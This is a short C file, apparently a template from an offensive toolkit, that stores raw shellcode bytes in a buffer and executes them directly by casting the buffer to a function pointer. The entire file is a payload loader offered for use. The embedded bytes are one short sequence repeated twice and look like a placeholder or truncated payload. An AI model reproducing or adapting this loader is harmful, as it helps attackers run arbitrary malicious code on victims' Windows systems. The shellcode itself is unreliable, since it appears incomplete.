// C template | Author: r00t-3xp10it

#include <stdio.h>
#include <windows.h>

// Our code goes here
unsigned char buf[]=
"\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00"
"\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00";

// Push into memory
int main(void) { ((void (*)())buf)();}



